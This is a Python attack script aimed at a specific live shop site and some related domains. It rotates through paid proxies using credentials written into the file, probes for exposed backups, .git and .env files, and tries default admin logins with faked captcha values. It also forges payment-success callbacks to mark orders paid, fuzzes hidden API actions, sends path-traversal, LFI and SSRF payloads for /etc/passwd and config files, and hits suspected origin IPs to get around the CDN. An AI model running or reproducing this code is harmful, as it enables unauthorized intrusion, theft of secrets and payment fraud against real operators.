#!/usr/bin/env python3
"""qq1.lol deep8 — new directions beyond /sup brute.
Paths/backups, user/fenzhan, pay channel, novel acts, template/LFI, origin.
"""
import hashlib
import json
import re
import subprocess
import time
import urllib.parse
from datetime import datetime
from pathlib import Path

BASE = "https://qq1.lol"
OUT = Path("/tmp/qq1_deep8")
OUT.mkdir(exist_ok=True)
LOG = OUT / "deep8.log"
HITS = OUT / "hits.jsonl"
REPORT = OUT / "report.json"
QG, PW = "C413ED6D", "344F550A6F8B"
JAR = str(OUT / "c.jar")
report = {"ts": datetime.now().isoformat(), "findings": [], "tests": []}
_px = None
_fail = 0


def log(m):
    line = f"[{datetime.now():%H:%M:%S}] {m}"
    print(line, flush=True)
    open(LOG, "a").write(line + "\n")


def hit(kind, detail, body=""):
    rec = {"kind": kind, "detail": detail, "body": (body or "")[:8000]}
    report["findings"].append(rec)
    open(HITS, "a").write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:250]}")


def proxy(force=False):
    global _px, _fail
    if _px and not force and _fail < 3:
        return _px
    servers = []
    try:
        d = json.loads(subprocess.check_output(
            ["curl", "-s", "--max-time", "10", f"https://share.proxy.qg.net/query?key={QG}"],
            text=True, timeout=12))
        servers = [x["server"] for x in (d.get("data") or [])]
    except Exception as e:
        log(f"query {e}")
    if not servers or force:
        time.sleep(1.5)
        for area in ("440000", "0", "330000", "320000"):
            try:
                d = json.loads(subprocess.check_output(
                    ["curl", "-s", "--max-time", "10",
                     f"https://share.proxy.qg.net/get?key={QG}&num=2&area={area}"],
                    text=True, timeout=12))
                if d.get("code") == "SUCCESS":
                    servers = [x["server"] for x in d["data"]] + servers
                    break
                log(f"get {area}: {d.get('code')}")
            except Exception:
                pass
            time.sleep(1)
    for s in servers:
        cand = f"http://{QG}:{PW}@{s}"
        code = subprocess.run(
            ["curl", "-sk", "--max-time", "10", "-x", cand, "-o", "/dev/null",
             "-w", "%{http_code}", f"{BASE}/%61pi.php?act=siteinfo"],
            capture_output=True, text=True, timeout=14).stdout.strip()
        if code == "200":
            _px, _fail = cand, 0
            log(f"proxy {s}")
            return _px
    return _px


def curl(url, post=None, mt=16, tries=4, follow=False, headers=None):
    global _fail
    last = ("", "000")
    for _ in range(tries):
        px = proxy()
        if not px:
            time.sleep(2)
            proxy(True)
            continue
        cmd = ["curl", "-sk", "--max-time", str(mt), "-x", px, "-b", JAR, "-c", JAR,
               "-A", "Mozilla/5.0", "-H", "Referer: https://qq1.lol/",
               "-H", "X-Requested-With: XMLHttpRequest",
               "-w", "\n__HTTP:%{http_code}"]
        if follow:
            cmd.insert(1, "-L")
        if headers:
            for h in headers:
                cmd += ["-H", h]
        if post is not None:
            body = urllib.parse.urlencode(post) if isinstance(post, dict) else str(post)
            cmd += ["-X", "POST", "--data-binary", body,
                    "-H", "Content-Type: application/x-www-form-urlencoded"]
        cmd.append(url)
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=mt + 6).stdout or ""
        except Exception as e:
            out = str(e)
        if "__HTTP:" not in out:
            _fail += 1
            proxy(True)
            continue
        b, code = out.rsplit("__HTTP:", 1)
        last = (b.strip(), code.strip())
        if code.strip() not in ("000", "408", "502", "503"):
            return last
        _fail += 1
        proxy(True)
    return last


def rec(name, body, code):
    report["tests"].append({"name": name, "code": code, "body": (body or "")[:500]})
    interesting = False
    if code in ("200", "301", "302", "403", "500") and body:
        if any(x in body for x in ("root:", "DB_", "password", "mysqli", "SYS_KEY", "apikey",
                                    "<?php", "AKIA", "sk_live", "sqlite", "PDO")):
            interesting = True
        if code == "200" and len(body) > 50 and "<html" not in body[:80].lower() and "危险" not in body:
            if name.startswith("path_") or name.startswith("bak_"):
                interesting = True
    log(f"  {name}: HTTP={code} len={len(body or '')} {(body or '')[:120].replace(chr(10),' ')}")
    if interesting:
        hit("interesting", name, body)


def section_paths():
    log("=== PATHS / BACKUPS / ADMIN ===")
    paths = [
        "/.git/HEAD", "/.git/config", "/.svn/entries", "/.env", "/.env.local", "/config.php",
        "/config.php.bak", "/config.php~", "/config.php.old", "/config.php.save",
        "/includes/config.php", "/includes/common.php", "/includes/.env",
        "/admin/", "/admin.php", "/admin/login.php", "/manage/", "/manager/",
        "/backend/", "/houtai/", "/ht/", "/denglu/", "/login.php",
        "/user/", "/user/index.php", "/user/ajax.php", "/user/connect.php",
        "/fenzhan/", "/site/", "/sites/", "/partner/",
        "/install/", "/install/index.php", "/install/install.lock",
        "/composer.json", "/composer.lock", "/package.json", "/README.md", "/robots.txt",
        "/sitemap.xml", "/crossdomain.xml", "/.well-known/security.txt",
        "/phpinfo.php", "/info.php", "/test.php", "/debug.php", "/status.php",
        "/server-status", "/nginx_status",
        "/assets/", "/assets/faka/", "/template/", "/templates/",
        "/includes/", "/other/", "/other/alipay.php", "/other/epay.config.php",
        "/other/epay_notify.php", "/other/epay_return.php", "/other/submit.php",
        "/other/qqpay.php", "/other/wxpay.php", "/other/alipay_notify.php",
        "/cron.php", "/toollogs.php", "/doc.php", "/api.php", "/%61pi.php",
        "/ajax.php", "/getshop.php", "/includes/authcode.php",
        "/backup/", "/bak/", "/sql/", "/db.sql", "/qq1.sql", "/dump.sql",
        "/www.zip", "/www.rar", "/backup.zip", "/site.zip", "/web.zip",
        "/qq1.lol.zip", "/1.zip", "/html.zip", "/public.zip",
        "/.DS_Store", "/web.config", "/.htaccess",
        "/ueditor/", "/ueditor/php/controller.php", "/ueditor/php/config.json",
        "/kindeditor/", "/upload/", "/uploads/", "/attach/", "/attachment/",
        "/static/", "/runtime/", "/cache/", "/log/", "/logs/", "/data/",
        "/includes/lib/", "/includes/pages/", "/includes/functions.php",
        "/sup/", "/sup/index.php", "/sup/ajax.php", "/sup/login.php",
        "/workorder.php", "/?mod=workorder", "/?mod=panel", "/?mod=admin",
        "/index.php?m=Admin", "/index.php?s=/Admin",
        "/v2/", "/api/v1/", "/api/v2/", "/graphql",
        "/metrics", "/actuator", "/favicon.ico",
    ]
    for p in paths:
        body, code = curl(BASE + p)
        name = "path_" + p.strip("/").replace("/", "_")[:60]
        rec(name, body, code)
        # save interesting non-html
        if code == "200" and body and len(body) < 200000:
            if p.endswith((".php", ".json", ".env", ".lock", ".sql", ".md", ".txt", ".xml", ".git/HEAD", ".git/config")) \
               or "password" in body.lower() or "<?php" in body[:200]:
                safe = re.sub(r"\W+", "_", p)[:80]
                (OUT / f"save{safe}").write_text(body[:100000], errors="replace")
        time.sleep(0.12)
        if paths.index(p) and paths.index(p) % 25 == 0:
            proxy(True)


def section_user_fenzhan():
    log("=== USER / FENZHAN ===")
    Path(JAR).unlink(missing_ok=True)
    home, _ = curl(BASE + "/")
    csrf_m = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', home or "")
    csrf = csrf_m.group(1) if csrf_m else ""
    log(f"csrf={bool(csrf)}")

    for path in ["/user/login.php", "/user/reg.php", "/user/findpwd.php", "/user/recharge.php",
                 "/user/index.php", "/user/shop.php", "/user/clist.php", "/user/connect.php"]:
        b, c = curl(BASE + path)
        rec("userpage_" + path.split("/")[-1], b, c)
        (OUT / ("user_" + path.split("/")[-1] + ".html")).write_text(b or "", errors="replace")
        # extract forms / js endpoints
        acts = re.findall(r'ajax\.php\?act=([a-zA-Z0-9_]+)', b or "")
        if acts:
            log(f"  acts in {path}: {sorted(set(acts))[:30]}")
            report.setdefault("page_acts", {})[path] = sorted(set(acts))

    # try reg without geetest / with fake
    for payload in [
        {"user": "probe" + str(int(time.time()) % 100000), "pwd": "Test123456", "qq": "10001",
         "csrf_token": csrf, "geetest_challenge": "1", "geetest_validate": "1", "geetest_seccode": "1|jordan"},
        {"user": "probeu", "pass": "Test123456", "qq": "10001", "email": "a@b.c", "csrf_token": csrf},
    ]:
        b, c = curl(BASE + "/ajax.php?act=reg", payload)
        rec("ajax_reg", b, c)
        if b and ("成功" in b or '"code":0' in b or '"code":1' in b):
            hit("reg_ok", payload.get("user"), b)

    # connect / oauth redirects
    for t in ("qq", "wx", "alipay", "weibo"):
        b, c = curl(BASE + f"/user/connect.php?type={t}")
        rec(f"connect_{t}", b, c)
        locs = re.findall(r"https?://[^\s\"'<>]+", b or "")
        if locs:
            log(f"  connect {t} urls={locs[:5]}")
            report.setdefault("oauth", {})[t] = locs[:10]

    # fenzhan-ish acts
    for act, post in [
        ("getsite", {}), ("siteinfo", {}), ("getconfig", {}),
        ("getmoney", {}), ("getuser", {}), ("orderlist", {}),
        ("recharge", {"money": "1", "csrf_token": csrf}),
        ("withdraw", {"money": "1", "csrf_token": csrf}),
        ("userinfo", {"csrf_token": csrf}),
        ("login", {"user": "admin", "pass": "admin123", "csrf_token": csrf,
                   "geetest_challenge": "1", "geetest_validate": "1", "geetest_seccode": "1|jordan"}),
    ]:
        b, c = curl(BASE + f"/ajax.php?act={act}", post if post else None)
        rec(f"ajax_{act}", b, c)
        if b and '"code":0' in b and act in ("getconfig", "getmoney", "getuser", "orderlist", "userinfo", "getsite"):
            hit("ajax_leak", act, b)
        time.sleep(0.2)


def section_pay_deep():
    log("=== PAY CHANNEL DEEP ===")
    Path(JAR).unlink(missing_ok=True)
    curl(BASE + "/")
    buy, _ = curl(BASE + "/?mod=buy&cid=4&tid=102")
    csrf = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy or "")
    hs_m = re.search(r"var hashsalt=(.+);", buy or "")
    if not csrf or not hs_m:
        log("no buy tokens")
        return
    try:
        hs = subprocess.run(
            ["node", "-e", f"var hashsalt={hs_m.group(1)}; console.log(hashsalt)"],
            capture_output=True, text=True, timeout=5).stdout.strip()
    except Exception:
        hs = hs_m.group(1).strip().strip("'\"")
    pay, _ = curl(BASE + "/ajax.php?act=pay", {
        "tid": "102", "num": "1", "inputvalue": "deep8pay",
        "csrf_token": csrf.group(1), "hashsalt": hs,
        "geetest_challenge": "1", "geetest_validate": "1", "geetest_seccode": "1|jordan",
    })
    rec("pay", pay, "200")
    tn_m = re.search(r'"trade_no"\s*:\s*"(\d+)"', pay or "")
    if not tn_m:
        return
    tn = tn_m.group(1)
    report["trade_no"] = tn
    log(f"tn={tn}")

    # dump all other/ files content / errors
    for p in [
        f"/other/submit.php?type=alipay&orderid={tn}",
        f"/other/alipay.php?trade_no={tn}",
        f"/other/submit.php?type=qqpay&orderid={tn}",
        f"/other/qqpay.php?trade_no={tn}",
        f"/other/epay.config.php",
        f"/other/inc.php",
        f"/other/epay.php",
        f"/other/epayapi.php",
        f"/other/codepay.php",
        f"/other/pay.php",
        f"/includes/lib/epay.php",
        f"/includes/lib/Pay.php",
        f"/includes/lib/Payment.php",
    ]:
        b, c = curl(BASE + p)
        rec("payfile_" + p.split("/")[-1][:40], b, c)
        (OUT / ("pay_" + re.sub(r"\W+", "_", p)[:60])).write_text(b or "", errors="replace")
        # extract epay domains / pid
        urls = re.findall(r"https?://[a-zA-Z0-9._:/-]+", b or "")
        pids = re.findall(r"pid[=\"':\s]+([0-9A-Za-z]+)", b or "")
        if urls or pids:
            log(f"  extract {p}: pids={pids[:5]} urls={urls[:8]}")
            report.setdefault("pay_extract", {})[p] = {"pids": pids[:10], "urls": urls[:15]}
        time.sleep(0.25)

    # return/notify with more variants
    for path in [
        f"/other/epay_return.php", f"/other/epay_notify.php",
        f"/other/alipay_return.php", f"/other/alipay_notify.php",
        f"/other/qqpay_notify.php", f"/other/wxpay_notify.php",
        f"/other/notify_url.php", f"/other/return_url.php",
    ]:
        for post in [
            {"out_trade_no": tn, "trade_no": "T" + tn, "trade_status": "TRADE_SUCCESS",
             "money": "0.01", "pid": "1000", "type": "alipay", "name": "x",
             "sign": hashlib.md5(f"money=0.01&name=x&out_trade_no={tn}&pid=1000&trade_no=T{tn}&trade_status=TRADE_SUCCESS&type=alipay".encode()).hexdigest(),
             "sign_type": "MD5"},
            {"out_trade_no": tn, "trade_status": "TRADE_SUCCESS", "sign": "0" * 32},
        ]:
            b, c = curl(BASE + path, post)
            rec(f"cb_{path.split('/')[-1]}", b, c)
            if b and any(x in b.lower() for x in ("success", "ok")) and "fail" not in b.lower() and "签名" not in b and "error" not in b.lower():
                hit("callback", path, b)
            time.sleep(0.2)


def section_novel_acts():
    log("=== NOVEL ACTS / PARAMS ===")
    # scrape JS for acts
    for js in ["/assets/js/main.js", "/assets/js/app.js", "/assets/faka/js/faka.js",
               "/assets/js/ajax.js", "/user/assets/js/main.js", "/sup/assets/js/main.js"]:
        b, c = curl(BASE + js)
        if b and c == "200":
            acts = sorted(set(re.findall(r"act[=:'\"]([a-zA-Z0-9_]+)", b)))
            log(f"  js {js}: {len(b)}b acts={acts[:40]}")
            report.setdefault("js_acts", {})[js] = acts
            (OUT / ("js_" + js.strip("/").replace("/", "_"))).write_text(b[:200000], errors="replace")
            # secrets in js
            secrets = re.findall(r"(api[_-]?key|secret|token|password)\s*[:=]\s*['\"][^'\"]{6,}", b, re.I)
            if secrets:
                hit("js_secret", js, str(secrets)[:500])

    # fuzzy acts
    acts = [
        "export", "kami", "kmlist", "getkm", "card", "cards", "faka", "dump",
        "backup", "config", "set", "setting", "sys", "debug", "phpinfo",
        "upload", "file", "files", "down", "download", "log", "logs",
        "adminlogin", "suplogin", "sitelogin", "token", "gettoken",
        "invite", "invite_code", "share", "poster", "qiandao", "checkin",
        "pricejk", "updatestatus", "dj", "docking", "shequ", "clone",
        "getclass", "gettool", "gettoolnew", "getcount", "getleftcount",
        "cart_add", "cart_buy", "batch", "import", "reset",
        "query2", "orderinfo", "kminfo", "showOrder",
    ]
    for act in acts:
        for base in (f"{BASE}/ajax.php?act={act}", f"{BASE}/%61pi.php?act={act}",
                     f"{BASE}/sup/ajax.php?act={act}", f"{BASE}/user/ajax.php?act={act}"):
            b, c = curl(base, {"id": "1", "key": "test", "limit": "5"} if "api" in base or "%61" in base else {"id": "1"})
            if not b:
                continue
            if "No Act" in b or "csrf" in b.lower() or "请登录" in b or "请先" in b:
                continue
            if "危险" in b or "<html" in b[:40].lower():
                continue
            rec(f"act_{act}_" + base.split("/")[-1][:20], b, c)
            if any(x in b for x in ("tid", "km", "card", "order", "成功", '"code":0')) and "错误" not in b:
                hit("novel_act", f"{act}@{base}", b)
        time.sleep(0.08)


def section_lfi_template():
    log("=== LFI / TEMPLATE / INCLUDE ===")
    payloads = [
        ("/?mod=../../../../etc/passwd", None),
        ("/?mod=....//....//....//etc/passwd", None),
        ("/?file=../../../../etc/passwd", None),
        ("/?page=../../../../etc/passwd", None),
        ("/?mod=buy&cid=4&tid=102&template=../../../../etc/passwd", None),
        ("/index.php?mod=php://filter/convert.base64-encode/resource=config", None),
        ("/ajax.php?act=getshuoshuo&uin=0&hashsalt=1&url=http://127.0.0.1:80/", None),
        ("/ajax.php?act=getshareid&url=http://127.0.0.1/", {"url": "http://127.0.0.1/"}),
        ("/other/submit.php?type=alipay&orderid=../../etc/passwd", None),
        ("/api.php?act=token&key=../../config.php", None),
        ("/%61pi.php?act=token&key=../../config.php", None),
    ]
    for url, post in payloads:
        b, c = curl(BASE + url if url.startswith("/") else url, post)
        rec("lfi_" + url[:50], b, c)
        if b and ("root:x:" in b or "PD9waH" in b or "DB_HOST" in b or "SYS_KEY" in b):
            hit("lfi", url, b)
        time.sleep(0.15)


def section_origin_host():
    log("=== ORIGIN / HOST BYPASS ===")
    for ip in ("45.158.21.213", "103.43.11.95"):
        # via proxy with Host + resolve-like by URL http://ip/
        for host in ("qq1.lol", "www.qq1.lol", "localhost"):
            b, c = curl(f"https://{ip}/", headers=[f"Host: {host}"])
            rec(f"origin_{ip}_{host}", b, c)
            b2, c2 = curl(f"https://{ip}/%61pi.php?act=siteinfo", headers=[f"Host: {host}"])
            rec(f"origin_api_{ip}_{host}", b2, c2)
            if b2 and "sitename" in b2:
                hit("origin_api", f"{ip}/{host}", b2)
            time.sleep(0.2)


def section_related():
    log("=== RELATED HOSTS ===")
    hosts = [
        "ka1.one", "www.ka1.one", "qq0.lol", "fffzz.lol", "hmjf.lol", "htqq.lol",
        "kln166.com", "t.me", "qqkqq.com", "buyi.lol", "buyiq.lol",
    ]
    for h in hosts:
        for scheme in ("https", "http"):
            b, c = curl(f"{scheme}://{h}/")
            rec(f"host_{h}_{scheme}", b, c)
            if c == "200" and b and len(b) > 200:
                log(f"  LIVE {scheme}://{h}/ len={len(b)}")
                (OUT / f"host_{h}.html").write_text(b[:50000], errors="replace")
                # try siteinfo
                b2, c2 = curl(f"{scheme}://{h}/%61pi.php?act=siteinfo")
                if b2 and "sitename" in b2:
                    hit("related_siteinfo", h, b2)
            if c not in ("000",):
                break
            time.sleep(0.2)


def main():
    open(LOG, "w").write("")
    log("=== DEEP8 START ===")
    if not proxy(True):
        log("no proxy"); return
    section_paths()
    section_user_fenzhan()
    section_pay_deep()
    section_novel_acts()
    section_lfi_template()
    section_origin_host()
    section_related()
    REPORT.write_text(json.dumps(report, ensure_ascii=False, indent=2))
    log(f"=== DEEP8 DONE findings={len(report['findings'])} tests={len(report['tests'])} ===")


if __name__ == "__main__":
    main()
